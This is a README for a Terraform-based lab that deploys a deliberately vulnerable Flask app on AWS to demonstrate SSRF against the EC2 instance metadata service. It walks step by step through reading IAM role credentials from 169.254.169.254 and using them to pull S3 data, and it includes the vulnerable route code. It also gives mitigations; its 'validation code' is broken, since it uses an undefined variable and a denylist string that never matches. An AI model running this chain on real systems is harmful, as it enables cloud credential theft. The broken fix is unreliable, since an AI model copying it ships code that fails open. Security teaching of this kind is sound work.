# SSRF vulnerability demo
![AWS](https://img.shields.io/badge/AWS-%23FF9900.svg?style=for-the-badge&logo=amazon-aws&logoColor=white)![Terraform](https://img.shields.io/badge/terraform-%235835CC.svg?style=for-the-badge&logo=terraform&logoColor=white)

## Demo diagram 
![Diagram](/images/diagram.jpg)

## Purpose
Demonstrate a Server Side Request Forgery (SSRF) attack in the AWS environment which results in data rertviing from s3, similar to the [CapitalOne breach](https://www.capitalone.com/digital/facts2019/).
The environment will be deployed with Terraform IaC module.



## Prerequisites
* Active AWS account.
* AWS IAM user with AWS credential type: ["Access key - Programmatic access"](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_access-keys.html) and [AdministratorAccess](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_managed-vs-inline.html)

*  [Terraform installed](https://learn.hashicorp.com/tutorials/terraform/install-cli)
* Clone this repo to the environment which you run terraform from : 
```console
git clone https://github.com/ramibo/ssrf_aws_demo.git 
```
* [create a key pair ( the public key will be auto imported later to Amazon EC2 by terrafom ).](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/create-key-pairs.html)

* In the following files , set the parameters with your own values  :</br></br>__terraform.tfvars__:</br> `availability_zone` , `key_name`,`public_key`</br></br>__providers.tf__ :</br> `shared_config_files`,`shared_credentials_files`, `profile` , `region`



## Running the demo

1. `cd` to the  `ssrf_aws_demo` directory.

2. Run `terraform init` command to prepare your working directory for the next commands.

3. Run `terraform validate` command to check whether the configuration is valid.

4. Run `terraform plan` command to show the changes required by the current configuration.

5. Run `terraform apply` / `terraform apply -auto-approve` to create/update the infrastructure at AWS.

6. If there are no errors from the previous steps , from your terminal, run the following:
<br>__Important__<br> - The `host` can be the created ec2 instance [Public IPv4 address / DNS ](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html#concepts-public-addresses).<br>- In the next steps `bash$` prompt with `"command"` is for commands you need to run.

```console
bash$ curl -s http://host:5000 
AWS SSRF IMDSv1 demo
```

7. The `/uptime` page is vulnerable to an SSRF attack: 
We will utilize the URL parameter with the instance metadata URI --> retrieve the attached IAM role --> extract the security credentials as follows: 
```console
bash$ curl -s http://host:5000/uptime?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
aws_ssrf_demo_iam_role
bash$ curl -s http://host:5000/uptime?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/aws_ssrf_demo_iam_role
{
  "Code" : "Success",
  "LastUpdated" : "2022-12-20T20:56:29Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIASF",
  "SecretAccessKey" : "Id+zUu",
  "Token" : "IQoJb3JpZ2luX2VjEEUaCXVzLW",
  "Expiration" : "2022-12-21T03:31:14Z"
}
```

8. From the attached role security credentials output you got in your environment,  copy the values of : 
`AccessKeyId` 
`SecretAccessKey` 
`Token`

9. With AWS CLI - configure a new `aws_ssrf_demo_profile_s3` profile:
```console
aws configure --profile aws_ssrf_demo_profile_s3
```

10. Set the following parameters in your `"$HOME/.aws/credentials"` file with the value copied at step 8:
For example,
```console
[aws_ssrf_demo_profile_s3]
aws_access_key_id = ASIASF
aws_secret_access_key = Id+zUu
aws_session_token=IQoJb3JpZ2luX2VjEEUaCXVzLW
```

11. Get the data from s3  :
```console
# Get the list of s3 buckets
bash$ aws s3 ls --profile aws_ssrf_demo_profile_s3 
2022-12-20 22:55:47 aws-ssrf-demo-s3-bucket

# Get the bucket content
bash$ aws s3 ls aws-ssrf-demo-s3-bucket --profile aws_ssrf_demo_profile_s3 
2022-12-20 22:55:48        403 aws_ssrf_demo_data_file.json

# Create a directory
bash$ mkdir data_from_s3
bash$ cd data_from_s3/
bash$ ls -l
total 0

# Retrive the JSON file from the bucket
bash$ aws s3 cp s3://aws-ssrf-demo-s3-bucket/aws_ssrf_demo_data_file.json /$HOME/data_from_s3/ --profile aws_ssrf_demo_profile_s3 
download: s3://aws-ssrf-demo-s3-bucket/aws_ssrf_demo_data_file.json to ./aws_ssrf_demo_data_file.json

bash$ ls -l
total 8
-rw-r--r--  1 user  group  403 Dec 20 22:55 aws_ssrf_demo_data_file.json


!!! The SSRF attack was successful!!!
```

12. Run `terraform destroy` / `terraform destroy -auto-approve` to remove the infrastructure created at AWS.
## Mitigation Steps



1. Enabling IMDSv2 :</br> 
This step enforces requests to use a session token (applied in aws-ec2-metadata-token header ) that can only be used directly from the EC2 instance where that session began.</br> 
This step is the first that should be taken as the IMDSv2 service acts as a parallel layer to any application or web app firewall (WAF) vulnerblity / misconfiugration which we might not be aware of yet.</br>  
In addtion , the effort to apply it is minor ( updated AWS SDKs and CLIs) compared to the next options.</br>  
For our case (before `terraform destroy` ) run :


```console
aws ec2 modify-instance-metadata-options \
    --instance-id i-1234567898abcdef0 \
    --http-tokens required \
    --http-endpoint enabled
```

For example
```console
bash$ curl -s http://host:5000
AWS SSRF IMDSv1 demo

bash$ curl -s http://host:5000/uptime?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
aws_ssrf_demo_iam_role 

bash$ aws ec2 modify-instance-metadata-options --instance-id i-00d044e5f852fd277 --http-tokens required --http-endpoint enabled --profile aws_ssrf_demo_profile

bash$ curl -s http://host:5000/uptime?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
<?xml version="1.0" encoding="iso-8859-1"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
 <head>
  <title>401 - Unauthorized</title>
 </head>
 <body>
  <h1>401 - Unauthorized</h1>
 </body>
</html>

```
[More details on how to configure the instance metadata options](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-options.html).

2. Fix the application  ruuning in the ec2 instance by adding validation all client-supplied input data.</br>
For example , 
```python
#vulnerable code
@app.route('/uptime')
def url():
    url = request.args.get('url', '')
    if url:
        content = requests.get(url).text
        return (content)

#validation code
@app.route('/uptime')
def url():
    DENYURL = "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    url = request.args.get('url', '')
    
    if url:
        if DENYURL in url:
               raise ValueError

        else:
            content = requests.get(valid_url).text
            return (content)
```
3. Reduce permissions in the IAM role.</br>
For example:</br>


## Refrences
* [FreeCodeCamp - Learn Terraform (and AWS) by Building a Dev Environment – Full Course for Beginners](https://www.youtube.com/watch?v=iRaai1IBlB0)
* [An SSRF, privileged AWS keys and the Capital One breach](https://blog.appsecco.com/an-ssrf-privileged-aws-keys-and-the-capital-one-breach-4c3c2cded3af)
* [How to hack AWS instances that have the metadata service (IMDSv1) enabled](https://alexanderhose.com/how-to-hack-aws-instances-with-the-metadata-service-enabled/)

* https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/